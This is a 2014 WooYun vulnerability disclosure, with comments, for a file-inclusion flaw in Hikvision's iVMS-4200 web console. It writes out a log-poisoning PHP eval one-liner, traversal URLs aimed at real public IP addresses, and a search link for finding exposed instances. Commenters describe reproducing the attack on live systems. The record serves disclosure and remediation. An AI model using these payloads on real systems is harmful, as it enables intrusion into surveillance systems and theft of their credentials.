{"id": 58, "wybug_id": "wooyun-2014-072453", "wybug_title": "海康威视某系列控制台文件包含导致getshell", "wybug_corp": "海康威视", "wybug_author": "ModNar", "wybug_date": "2014-08-15 08:59", "wybug_open_date": "2014-11-13 09:00", "wybug_type": "文件包含", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-13：\t细节向公众公开  简要描述： 明显得不忍直视 详细说明：  无意中看到这样的一个系统，搜了一圈型号发现是海康威视IVMS系列的监控客户端，应用还挺广泛的，不过大部分扔在内网。http://www.hikvision.com/en/download_more.asp?id=1388（2014-07-08）iVMS-4200适用于嵌入式网络硬盘录像机、混合型网络硬盘录像机、网络视频服务器、NVR、IP Camera和解码设备以及视音频编解码卡，支持实时预览、远程回放和下载、资源管理、远程配置、用户管理、系统配置等多种功能。\n\n简单来说，它包含了一个WEB版的控制台，用到了一个比较小众的框架，然后被这个Xphp的框架卖了。是这个？http://so.imop.us/漏洞挺明显的，出现在controller参数的一个任意文件包含：构造URL访问使其记录在error.log中：http://222.47.62.226/<?eval($_POST['pass'])?>直接包含这个客户端自带的Nginx日志文件：http://222.47.62.226/index.php?controller=../../../../Server/logs/error.log%00.php\t借助fofa.so，结果有近百个还摆在外网服务器上（又可以批量开浏览器小窗开屏幕墙了）:http://fofa.so/search/result?q=body%3D%22iVMS-4200%22&qbase64=Ym9keT0iaVZNUy00MjAwIg%3D%3D\n\n   漏洞证明：  1.http://localhost/<?eval($_POST['pass'])?>\n\n2.http://219.148.26.104/index.php?controller=../../../../Server/logs/error.log%00.php\t\n\n随手菜刀上去：\n\n另外发现只要有用户登录，登录该系统的密码还是临时明文存在ssesion文件夹中的：\n\n   修复方案：  需要在框架层的Controller接收处用Basename处理下，本地文件明文保存用户名密码也是个隐患，如何推更新也是个问题，这种企业级敏感应用还是别扔到外网吧。   版权声明：转载请注明来源 ModNar@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-08-15 14:18 厂商回复： 问题已确认，将在下个版本中修复。感谢反馈，请私信联系方式领取礼品。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-25 23:50 |    \t\tsin \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:2        | 寻找最优雅的解决方案)\t\t \n  楼上帅哥，你的<?eval($_POST['pass'])?>确定是一句话？随便请问，你的菜刀一句话地址是？php一句话包含那个空格好难去掉额？难道成功与容器和php版本及函数的开启有关？    \n     2014-10-30 12:25 |    \t\tModNar \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 路人甲)\t\t \n  @sin 地址就是log文件，其余问题没看懂。    \n     2014-10-30 18:28 |    \t\tsin \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:2        | 寻找最优雅的解决方案)\t\t \n  @ModNar  楼上是洞主吧，我那天也测试了下，没成功getshell额。http://222.47.62.226/index.php?controller=../../../../Server/logs/error.log%00.php\t 。这个的意思是包含然后加个截断构成一句话话对吧。<?php eval($_POST['pass'])?>。前面有个php这样才能解析吧。中间的那个空格一直绕不过额。洞主你是怎么拿到shell的额？    \n     2014-11-13 09:40 |    \t\tdarker \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:26        | = =)\t\t \n  么么哒。    \n     2014-11-13 09:46 |    \t\t10457793 \t\t\t( 普通白帽子  |\t\t\t        Rank:867 漏洞数:128        | 说好的借，为什么从来不还？O(∩_∩)O)\t\t \n  @sin 我也没有复现成功 为什么那    \n     2014-11-13 10:28 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @sin 文件包含不看后缀啊    \n     2014-11-13 10:28 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @10457793 修复了吧    \n     2014-11-13 10:38 |    \t\t10457793 \t\t\t( 普通白帽子  |\t\t\t        Rank:867 漏洞数:128        | 说好的借，为什么从来不还？O(∩_∩)O)\t\t \n  @wefgod 刚刚找了两个案例 应该没有修改     \n     2014-11-13 11:20 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @10457793 复现成功了？    \n     2014-11-13 11:21 |    \t\t10457793 \t\t\t( 普通白帽子  |\t\t\t        Rank:867 漏洞数:128        | 说好的借，为什么从来不还？O(∩_∩)O)\t\t \n  @wefgod 我不是说么有嘛 所以才来问大家啊    \n     2014-11-13 11:37 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @10457793 洞主给的这个案例可以复现好像。C:\\Program Files\\iVMS-4200 Station\\iVMS-4200 Web\\Web\\www\\    \n     2014-11-13 11:52 |    \t\t10457793 \t\t\t( 普通白帽子  |\t\t\t        Rank:867 漏洞数:128        | 说好的借，为什么从来不还？O(∩_∩)O)\t\t \n  @wefgod 嗯    \n     2014-11-13 12:01 |    \t\tRona \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:23        | test)\t\t \n  复现，成功    \n     2014-11-17 10:30 |    \t\tModNar \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 路人甲)\t\t \n  @darker 嘿嘿，靠肥牛带    \n     2014-12-06 20:04 |    \t\t纠结师 \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:12        | 传说中的废材)\t\t \n  公司有在用   发现是个asp。。 我无语    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}